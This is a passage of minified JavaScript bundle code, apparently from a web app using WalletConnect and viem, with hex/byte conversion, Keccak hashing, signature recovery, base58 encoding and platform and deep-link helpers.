0:n.browser),{write:i=>r.write(i)})})),chunkLoggerController:r}}function h4(t){var e;const n=new t4((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Uc(rf(nf({},t.opts),{level:"trace"}),n),chunkLoggerController:n}}function f4(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?u4(t):h4(t)}var d4=Object.defineProperty,p4=(t,e,n)=>e in t?d4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,zb=(t,e,n)=>p4(t,typeof e!="symbol"?e+"":e,n);let g4=class extends ho{constructor(e){super(),this.opts=e,zb(this,"protocol","wc"),zb(this,"version",2)}};var y4=Object.defineProperty,m4=(t,e,n)=>e in t?y4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,w4=(t,e,n)=>m4(t,e+"",n);let v4=class extends ho{constructor(e,n){super(),this.core=e,this.logger=n,w4(this,"records",new Map)}},b4=class{constructor(e,n){this.logger=e,this.core=n}};class E4 extends ho{constructor(e,n){super(),this.relayer=e,this.logger=n}}let x4=class extends ho{constructor(e){super()}},S4=class{constructor(e,n,r,i){this.core=e,this.logger=n,this.name=r}},_4=class extends ho{constructor(e,n){super(),this.relayer=e,this.logger=n}},I4=class extends ho{constructor(e,n){super(),this.core=e,this.logger=n}},O4=class{constructor(e,n,r){this.core=e,this.logger=n,this.store=r}},$4=class{constructor(e,n){this.projectId=e,this.logger=n}},P4=class{constructor(e,n,r){this.core=e,this.logger=n,this.telemetryEnabled=r}};var T4=Object.defineProperty,A4=(t,e,n)=>e in t?T4(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,qb=(t,e,n)=>A4(t,typeof e!="symbol"?e+"":e,n);let C4=class{constructor(e){this.opts=e,qb(this,"protocol","wc"),qb(this,"version",2)}},R4=class{constructor(e){this.client=e}};var nt={},Hb;function g_(){if(Hb)return nt;Hb=1,Object.defineProperty(nt,"__esModule",{value:!0}),nt.getLocalStorage=nt.getLocalStorageOrThrow=nt.getCrypto=nt.getCryptoOrThrow=nt.getLocation=nt.getLocationOrThrow=nt.getNavigator=nt.getNavigatorOrThrow=nt.getDocument=nt.getDocumentOrThrow=nt.getFromWindowOrThrow=nt.getFromWindow=void 0;function t(g){let E;return typeof window<"u"&&typeof window[g]<"u"&&(E=window[g]),E}nt.getFromWindow=t;function e(g){const E=t(g);if(!E)throw new Error(`${g} is not defined in Window`);return E}nt.getFromWindowOrThrow=e;function n(){return e("document")}nt.getDocumentOrThrow=n;function r(){return t("document")}nt.getDocument=r;function i(){return e("navigator")}nt.getNavigatorOrThrow=i;function o(){return t("navigator")}nt.getNavigator=o;function l(){return e("location")}nt.getLocationOrThrow=l;function c(){return t("location")}nt.getLocation=c;function u(){return e("crypto")}nt.getCryptoOrThrow=u;function f(){return t("crypto")}nt.getCrypto=f;function d(){return e("localStorage")}nt.getLocalStorageOrThrow=d;function y(){return t("localStorage")}return nt.getLocalStorage=y,nt}var ki=g_(),Yl={},Vb;function D4(){if(Vb)return Yl;Vb=1,Object.defineProperty(Yl,"__esModule",{value:!0}),Yl.getWindowMetadata=void 0;const t=g_();function e(){let n,r;try{n=t.getDocumentOrThrow(),r=t.getLocationOrThrow()}catch{return null}function i(){const E=n.getElementsByTagName("link"),w=[];for(let b=0;b<E.length;b++){const m=E[b],x=m.getAttribute("rel");if(x&&x.toLowerCase().indexOf("icon")>-1){const S=m.getAttribute("href");if(S)if(S.toLowerCase().indexOf("https:")===-1&&S.toLowerCase().indexOf("http:")===-1&&S.indexOf("//")!==0){let O=r.protocol+"//"+r.host;if(S.indexOf("/")===0)O+=S;else{const $=r.pathname.split("/");$.pop();const R=$.join("/");O+=R+"/"+S}w.push(O)}else if(S.indexOf("//")===0){const O=r.protocol+S;w.push(O)}else w.push(S)}}return w}function o(...E){const w=n.getElementsByTagName("meta");for(let b=0;b<w.length;b++){const m=w[b],x=["itemprop","property","name"].map(S=>m.getAttribute(S)).filter(S=>S?E.includes(S):!1);if(x.length&&x){const S=m.getAttribute("content");if(S)return S}}return""}function l(){let E=o("name","og:site_name","og:title","twitter:title");return E||(E=n.title),E}function c(){return o("description","og:description","twitter:description","keywords")}const u=l(),f=c(),d=r.origin,y=i();return{description:f,url:d,icons:y,name:u}}return Yl.getWindowMetadata=e,Yl}var N4=D4();function Ec(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function Wb(t){return Ec(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const y_="2.23.2";let Jl={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:n})=>e?`${t??"https://viem.sh"}${e}${n?`#${n}`:""}`:void 0,version:`viem@${y_}`};class io extends Error{constructor(e,n={}){var c;const r=(()=>{var u;return n.cause instanceof io?n.cause.details:(u=n.cause)!=null&&u.message?n.cause.message:n.details})(),i=n.cause instanceof io&&n.cause.docsPath||n.docsPath,o=(c=Jl.getDocsUrl)==null?void 0:c.call(Jl,{...n,docsPath:i}),l=[e||"An error occurred.","",...n.metaMessages?[...n.metaMessages,""]:[],...o?[`Docs: ${o}`]:[],...r?[`Details: ${r}`]:[],...Jl.version?[`Version: ${Jl.version}`]:[]].join(`
`);super(l,n.cause?{cause:n.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=r,this.docsPath=i,this.metaMessages=n.metaMessages,this.name=n.name??this.name,this.shortMessage=e,this.version=y_}walk(e){return m_(this,e)}}function m_(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?m_(t.cause,e):e?null:t}class w_ extends io{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (${e}) exceeds padding size (${n}).`,{name:"SizeExceedsPaddingSizeError"})}}function Ga(t,{dir:e,size:n=32}={}){return typeof t=="string"?k4(t,{dir:e,size:n}):B4(t,{dir:e,size:n})}function k4(t,{dir:e,size:n=32}={}){if(n===null)return t;const r=t.replace("0x","");if(r.length>n*2)throw new w_({size:Math.ceil(r.length/2),targetSize:n,type:"hex"});return`0x${r[e==="right"?"padEnd":"padStart"](n*2,"0")}`}function B4(t,{dir:e,size:n=32}={}){if(n===null)return t;if(t.length>n)throw new w_({size:t.length,targetSize:n,type:"bytes"});const r=new Uint8Array(n);for(let i=0;i<n;i++){const o=e==="right";r[o?i:n-i-1]=t[o?i:t.length-i-1]}return r}class L4 extends io{constructor({max:e,min:n,signed:r,size:i,value:o}){super(`Number "${o}" is not in safe ${i?`${i*8}-bit ${r?"signed":"unsigned"} `:""}integer range ${e?`(${n} to ${e})`:`(above ${n})`}`,{name:"IntegerOutOfRangeError"})}}class j4 extends io{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed ${n} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}}function Ya(t,{size:e}){if(Wb(t)>e)throw new j4({givenSize:Wb(t),maxSize:e})}function Dy(t,e={}){const{signed:n}=e;e.size&&Ya(t,{size:e.size});const r=BigInt(t);if(!n)return r;const i=(t.length-2)/2,o=(1n<<BigInt(i)*8n-1n)-1n;return r<=o?r:r-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function U4(t,e={}){return Number(Dy(t,e))}const M4=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Ny(t,e={}){return typeof t=="number"||typeof t=="bigint"?b_(t,e):typeof t=="string"?q4(t,e):typeof t=="boolean"?F4(t,e):v_(t,e)}function F4(t,e={}){const n=`0x${Number(t)}`;return typeof e.size=="number"?(Ya(n,{size:e.size}),Ga(n,{size:e.size})):n}function v_(t,e={}){let n="";for(let i=0;i<t.length;i++)n+=M4[t[i]];const r=`0x${n}`;return typeof e.size=="number"?(Ya(r,{size:e.size}),Ga(r,{dir:"right",size:e.size})):r}function b_(t,e={}){const{signed:n,size:r}=e,i=BigInt(t);let o;r?n?o=(1n<<BigInt(r)*8n-1n)-1n:o=2n**(BigInt(r)*8n)-1n:typeof t=="number"&&(o=BigInt(Number.MAX_SAFE_INTEGER));const l=typeof o=="bigint"&&n?-o-1n:0;if(o&&i>o||i<l){const u=typeof t=="bigint"?"n":"";throw new L4({max:o?`${o}${u}`:void 0,min:`${l}${u}`,signed:n,size:r,value:`${t}${u}`})}const c=`0x${(n&&i<0?(1n<<BigInt(r*8))+BigInt(i):i).toString(16)}`;return r?Ga(c,{size:r}):c}const z4=new TextEncoder;function q4(t,e={}){const n=z4.encode(t);return v_(n,e)}const H4=new TextEncoder;function V4(t,e={}){return typeof t=="number"||typeof t=="bigint"?K4(t,e):typeof t=="boolean"?W4(t,e):Ec(t)?E_(t,e):x_(t,e)}function W4(t,e={}){const n=new Uint8Array(1);return n[0]=Number(t),typeof e.size=="number"?(Ya(n,{size:e.size}),Ga(n,{size:e.size})):n}const yi={zero:48,nine:57,A:65,F:70,a:97,f:102};function Kb(t){if(t>=yi.zero&&t<=yi.nine)return t-yi.zero;if(t>=yi.A&&t<=yi.F)return t-(yi.A-10);if(t>=yi.a&&t<=yi.f)return t-(yi.a-10)}function E_(t,e={}){let n=t;e.size&&(Ya(n,{size:e.size}),n=Ga(n,{dir:"right",size:e.size}));let r=n.slice(2);r.length%2&&(r=`0${r}`);const i=r.length/2,o=new Uint8Array(i);for(let l=0,c=0;l<i;l++){const u=Kb(r.charCodeAt(c++)),f=Kb(r.charCodeAt(c++));if(u===void 0||f===void 0)throw new io(`Invalid byte sequence ("${r[c-2]}${r[c-1]}" in "${r}").`);o[l]=u*16+f}return o}function K4(t,e){const n=b_(t,e);return E_(n)}function x_(t,e={}){const n=H4.encode(t);return typeof e.size=="number"?(Ya(n,{size:e.size}),Ga(n,{dir:"right",size:e.size})):n}function sf(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function G4(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Cf(t,...e){if(!G4(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function XK(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");sf(t.outputLen),sf(t.blockLen)}function Gb(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function Y4(t,e){Cf(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const xh=BigInt(2**32-1),Yb=BigInt(32);function J4(t,e=!1){return e?{h:Number(t&xh),l:Number(t>>Yb&xh)}:{h:Number(t>>Yb&xh)|0,l:Number(t&xh)|0}}function Z4(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l}=J4(t[i],e);[n[i],r[i]]=[o,l]}return[n,r]}const Q4=(t,e,n)=>t<<n|e>>>32-n,X4=(t,e,n)=>e<<n|t>>>32-n,eB=(t,e,n)=>e<<n-32|t>>>64-n,tB=(t,e,n)=>t<<n-32|e>>>64-n,Ko=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function nB(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function eG(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function tG(t,e){return t<<32-e|t>>>e}const Jb=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function rB(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function Zb(t){for(let e=0;e<t.length;e++)t[e]=rB(t[e])}function iB(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function S_(t){return typeof t=="string"&&(t=iB(t)),Cf(t),t}function nG(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Cf(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}class sB{clone(){return this._cloneInto()}}function oB(t){const e=r=>t().update(S_(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function rG(t=32){if(Ko&&typeof Ko.getRandomValues=="function")return Ko.getRandomValues(new Uint8Array(t));if(Ko&&typeof Ko.randomBytes=="function")return Ko.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const __=[],I_=[],O_=[],aB=BigInt(0),Zl=BigInt(1),lB=BigInt(2),cB=BigInt(7),uB=BigInt(256),hB=BigInt(113);for(let t=0,e=Zl,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],__.push(2*(5*r+n)),I_.push((t+1)*(t+2)/2%64);let i=aB;for(let o=0;o<7;o++)e=(e<<Zl^(e>>cB)*hB)%uB,e&lB&&(i^=Zl<<(Zl<<BigInt(o))-Zl);O_.push(i)}const[fB,dB]=Z4(O_,!0),Qb=(t,e,n)=>n>32?eB(t,e,n):Q4(t,e,n),Xb=(t,e,n)=>n>32?tB(t,e,n):X4(t,e,n);function pB(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let l=0;l<10;l++)n[l]=t[l]^t[l+10]^t[l+20]^t[l+30]^t[l+40];for(let l=0;l<10;l+=2){const c=(l+8)%10,u=(l+2)%10,f=n[u],d=n[u+1],y=Qb(f,d,1)^n[c],g=Xb(f,d,1)^n[c+1];for(let E=0;E<50;E+=10)t[l+E]^=y,t[l+E+1]^=g}let i=t[2],o=t[3];for(let l=0;l<24;l++){const c=I_[l],u=Qb(i,o,c),f=Xb(i,o,c),d=__[l];i=t[d],o=t[d+1],t[d]=u,t[d+1]=f}for(let l=0;l<50;l+=10){for(let c=0;c<10;c++)n[c]=t[l+c];for(let c=0;c<10;c++)t[l+c]^=~n[(c+2)%10]&n[(c+4)%10]}t[0]^=fB[r],t[1]^=dB[r]}n.fill(0)}class Xm extends sB{constructor(e,n,r,i=!1,o=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=o,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,sf(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=nB(this.state)}keccak(){Jb||Zb(this.state32),pB(this.state32,this.rounds),Jb||Zb(this.state32),this.posOut=0,this.pos=0}update(e){Gb(this);const{blockLen:n,state:r}=this;e=S_(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(n-this.pos,i-o);for(let c=0;c<l;c++)r[this.pos++]^=e[o++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Gb(this,!1),Cf(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,o=e.length;i<o;){this.posOut>=r&&this.keccak();const l=Math.min(r-this.posOut,o-i);e.set(n.subarray(this.posOut,this.posOut+l),i),this.posOut+=l,i+=l}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return sf(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(Y4(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:o,enableXOF:l}=this;return e||(e=new Xm(n,r,i,l,o)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=o,e.suffix=r,e.outputLen=i,e.enableXOF=l,e.destroyed=this.destroyed,e}}const gB=(t,e,n)=>oB(()=>new Xm(e,t,n)),yB=gB(1,136,256/8);function $_(t,e){const n=e||"hex",r=yB(Ec(t,{strict:!1})?V4(t):t);return n==="bytes"?r:Ny(r)}class mB extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const n=super.get(e);return super.has(e)&&n!==void 0&&(this.delete(e),super.set(e,n)),n}set(e,n){if(super.set(e,n),this.maxSize&&this.size>this.maxSize){const r=this.keys().next().value;r&&this.delete(r)}return this}}const Og=new mB(8192);function wB(t,e){if(Og.has(`${t}.${e}`))return Og.get(`${t}.${e}`);const n=t.substring(2).toLowerCase(),r=$_(x_(n),"bytes"),i=n.split("");for(let l=0;l<40;l+=2)r[l>>1]>>4>=8&&i[l]&&(i[l]=i[l].toUpperCase()),(r[l>>1]&15)>=8&&i[l+1]&&(i[l+1]=i[l+1].toUpperCase());const o=`0x${i.join("")}`;return Og.set(`${t}.${e}`,o),o}function vB(t){const e=$_(`0x${t.substring(4)}`).substring(26);return wB(`0x${e}`)}async function bB({hash:t,signature:e}){const n=Ec(t)?t:Ny(t),{secp256k1:r}=await xa(async()=>{const{secp256k1:l}=await import("./secp256k1-CptN-4dv.js");return{secp256k1:l}},[]);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:f,s:d,v:y,yParity:g}=e,E=Number(g??y),w=eE(E);return new r.Signature(Dy(f),Dy(d)).addRecoveryBit(w)}const l=Ec(e)?e:Ny(e),c=U4(`0x${l.slice(130)}`),u=eE(c);return r.Signature.fromCompact(l.substring(2,130)).addRecoveryBit(u)})().recoverPublicKey(n.substring(2)).toHex(!1)}`}function eE(t){if(t===0||t===1)return t;if(t===27)return 0;if(t===28)return 1;throw new Error("Invalid yParityOrV value")}async function EB({hash:t,signature:e}){return vB(await bB({hash:t,signature:e}))}function xB(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let f=0;f<e.length;f++)e[f]=255;for(let f=0;f<t.length;f++){const d=t.charAt(f),y=d.charCodeAt(0);if(e[y]!==255)throw new TypeError(d+" is ambiguous");e[y]=f}const n=t.length,r=t.charAt(0),i=Math.log(n)/Math.log(256),o=Math.log(256)/Math.log(n);function l(f){if(f instanceof Uint8Array||(ArrayBuffer.isView(f)?f=new Uint8Array(f.buffer,f.byteOffset,f.byteLength):Array.isArray(f)&&(f=Uint8Array.from(f))),!(f instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(f.length===0)return"";let d=0,y=0,g=0;const E=f.length;for(;g!==E&&f[g]===0;)g++,d++;const w=(E-g)*o+1>>>0,b=new Uint8Array(w);for(;g!==E;){let S=f[g],O=0;for(let $=w-1;(S!==0||O<y)&&$!==-1;$--,O++)S+=256*b[$]>>>0,b[$]=S%n>>>0,S=S/n>>>0;if(S!==0)throw new Error("Non-zero carry");y=O,g++}let m=w-y;for(;m!==w&&b[m]===0;)m++;let x=r.repeat(d);for(;m<w;++m)x+=t.charAt(b[m]);return x}function c(f){if(typeof f!="string")throw new TypeError("Expected String");if(f.length===0)return new Uint8Array;let d=0,y=0,g=0;for(;f[d]===r;)y++,d++;const E=(f.length-d)*i+1>>>0,w=new Uint8Array(E);for(;d<f.length;){const S=f.charCodeAt(d);if(S>255)return;let O=e[S];if(O===255)return;let $=0;for(let R=E-1;(O!==0||$<g)&&R!==-1;R--,$++)O+=n*w[R]>>>0,w[R]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");g=$,d++}let b=E-g;for(;b!==E&&w[b]===0;)b++;const m=new Uint8Array(y+(E-b));let x=y;for(;b!==E;)m[x++]=w[b++];return m}function u(f){const d=c(f);if(d)return d;throw new Error("Non-base"+n+" character")}return{encode:l,decodeUnsafe:c,decode:u}}var SB="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const _B=xB(SB);var IB={};const OB=":";function zh(t){const[e,n]=t.split(OB);return{namespace:e,reference:n}}function P_(t,e){return t.includes(":")?[t]:e.chains||[]}var $B=Object.defineProperty,PB=Object.defineProperties,TB=Object.getOwnPropertyDescriptors,tE=Object.getOwnPropertySymbols,AB=Object.prototype.hasOwnProperty,CB=Object.prototype.propertyIsEnumerable,nE=(t,e,n)=>e in t?$B(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,rE=(t,e)=>{for(var n in e||(e={}))AB.call(e,n)&&nE(t,n,e[n]);if(tE)for(var n of tE(e))CB.call(e,n)&&nE(t,n,e[n]);return t},RB=(t,e)=>PB(t,TB(e));const DB="ReactNative",tr={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},NB="js";function of(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function bs(){return!ki.getDocument()&&!!ki.getNavigator()&&navigator.product===DB}function kB(){return bs()&&typeof globalThis<"u"&&typeof(globalThis==null?void 0:globalThis.Platform)<"u"&&(globalThis==null?void 0:globalThis.Platform.OS)==="android"}function BB(){return bs()&&typeof globalThis<"u"&&typeof(globalThis==null?void 0:globalThis.Platform)<"u"&&(globalThis==null?void 0:globalThis.Platform.OS)==="ios"}function Ja(){return!of()&&!!ki.getNavigator()&&!!ki.getDocument()}function Fc(){return bs()?tr.reactNative:of()?tr.node:Ja()?tr.browser:tr.unknown}function iE(){var t;try{return bs()&&typeof globalThis<"u"&&typeof(globalThis==null?void 0:globalThis.Application)<"u"?(t=globalThis.Application)==null?void 0:t.applicationId:void 0}catch{return}}function LB(t,e){const n=new URLSearchParams(t);for(const r of Object.keys(e).sort())if(e.hasOwnProperty(r)){const i=e[r];i!==void 0&&n.set(r,i)}return n.toString()}function jB(t){var e,n;const r=T_();try{return t!=null&&t.url&&r.url&&new URL(t.url).host!==new URL(r.url).host&&(console.warn(`The configured WalletConnect 'metadata.url':${t.url} differs from the actual page url:${r.url}. This is probably unintended and can lead to issues.`),t.url=r.url),(e=t==null?void 0:t.icons)!=null&&e.length&&t.icons.length>0&&(t.icons=t.icons.filter(i=>i!=="")),RB(rE(rE({},r),t),{url:(t==null?void 0:t.url)||r.url,name:(t==null?void 0:t.name)||r.name,description:(t==null?void 0:t.description)||r.description,icons:(n=t==null?void 0:t.icons)!=null&&n.length&&t.icons.length>0?t.icons:r.icons})}catch(i){return console.warn("Error populating app metadata",i),t||r}}function T_(){return N4.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function UB(){if(Fc()===tr.reactNative&&typeof globalThis<"u"&&typeof(globalThis==null?void 0:globalThis.Platform)<"u"){const{OS:n,Version:r}=globalThis.Platform;return[n,r].join("-")}const t=JT();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function MB(){var t;const e=Fc();return e===tr.browser?[e,((t=ki.getLocation())==null?void 0:t.host)||"unknown"].join(":"):e}function A_(t,e,n){const r=UB(),i=MB();return[[t,e].join("-"),[NB,n].join("-"),r,i].join("/")}function FB({protocol:t,version:e,relayUrl:n,sdkVersion:r,auth:i,projectId:o,useOnCloseEvent:l,bundleId:c,packageName:u}){const f=n.split("?"),d=A_(t,e,r),y={auth:i,ua:d,projectId:o,useOnCloseEvent:l,packageName:u||void 0,bundleId:c||void 0},g=LB(f[1]||"",y);return f[0]+"?"+g}function Js(t,e){return t.filter(n=>e.includes(n)).length===t.length}function ky(t){return Object.fromEntries(t.entries())}function By(t){return new Map(Object.entries(t))}function Fs(t=be.FIVE_MINUTES,e){const n=be.toMiliseconds(t||be.FIVE_MINUTES);let r,i,o,l;return{resolve:c=>{o&&r&&(clearTimeout(o),r(c),l=Promise.resolve(c))},reject:c=>{o&&i&&(clearTimeout(o),i(c))},done:()=>new Promise((c,u)=>{if(l)return c(l);o=setTimeout(()=>{const f=new Error(e);l=Promise.reject(f),u(f)},n),r=c,i=u})}}function gs(t,e,n){return new Promise(async(r,i)=>{const o=setTimeout(()=>i(new Error(n)),e);try{const l=await t;r(l)}catch(l){i(l)}clearTimeout(o)})}function C_(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function zB(t){return C_("topic",t)}function qB(t){return C_("id",t)}function R_(t){const[e,n]=t.split(":"),r={id:void 0,topic:void 0};if(e==="topic"&&typeof n=="string")r.topic=n;else if(e==="id"&&Number.isInteger(Number(n)))r.id=Number(n);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${n}`);return r}function Nt(t,e){return be.fromMiliseconds(Date.now()+be.toMiliseconds(t))}function fs(t){return Date.now()>=be.toMiliseconds(t)}function Je(t,e){return`${t}${e?`:${e}`:""}`}function HB(t=[],e=[]){return[...new Set([...t,...e])]}async function VB({id:t,topic:e,wcDeepLink:n}){var r;try{if(!n)return;const i=typeof n=="string"?JSON.parse(n):n,o=i==null?void 0:i.href;if(typeof o!="string")return;const l=WB(o,t,e),c=Fc();if(c===tr.browser){if(!((r=ki.getDocument())!=null&&r.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}KB(l)}else c===tr.reactNative&&typeof(globalThis==null?void 0:globalThis.Linking)<"u"&&await globalThis.Linking.openURL(l)}catch(i){console.error(i)}}function WB(t,e,n){const r=`requestId=${e}&sessionTopic=${n}`;t.endsWith("/")&&(t=t.slice(0,-1));let i=`${t}`;if(t.startsWith("https://t.me")){const o=t.includes("?")?"&startapp=":"?startapp=";i=`${i}${o}${ZB(r,!0)}`}else i=`${i}/wc?${r}`;return i}function KB(t){let e="_self";JB()?e="_top":(YB()||t.startsWith("https://")||t.startsWith("http://"))&&(e="_blank"),window.open(t,e,"noreferrer noopener")}async function GB(t,e){let n="";try{if(Ja()&&(n=localStorage.getItem(e),n))return n;n=await t.getItem(e)}catch(r){console.error(r)}return n}function sE(t,e){if(!t.includes(e))return null;const n=t.split(/([&,?,=])/),r=n.indexOf(e);return n[r+2]}function oE(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})}function ew(){return typeof process<"u"&&IB.IS_VITEST==="true"}function YB(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function JB(){try{return window.self!==window.top}catch{return!1}}function ZB(t,e=!1){const n=Buffer.from(t).toString("base64");return e?n.replace(/[=]/g,""):n}function D_(t){return Buffer.from(t,"base64").toString("utf-8")}function QB(t){return new Promise(e=>setTimeout(e,t))}function xc(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function XB(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function zc(t,...e){if(!XB(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function tw(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");xc(t.outputLen),xc(t.blockLen)}function Ca(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function N_(t,e){zc(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const Sh=BigInt(2**32-1),aE=BigInt(32);function e5(t,e=!1){return e?{h:Number(t&Sh),l:Number(t>>aE&Sh)}:{h:Number(t>>aE&Sh)|0,l:Number(t&Sh)|0}}function t5(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l}=e5(t[i],e);[n[i],r[i]]=[o,l]}return[n,r]}const n5=(t,e,n)=>t<<n|e>>>32-n,r5=(t,e,n)=>e<<n|t>>>32-n,i5=(t,e,n)=>e<<n-32|t>>>64-n,s5=(t,e,n)=>t<<n-32|e>>>64-n,Go=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function o5(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function $g(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Vr(t,e){return t<<32-e|t>>>e}const lE=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function a5(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function cE(t){for(let e=0;e<t.length;e++)t[e]=a5(t[e])}function l5(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function Ra(t){return typeof t=="string"&&(t=l5(t)),zc(t),t}function c5(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];zc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}let nw=class{clone(){return 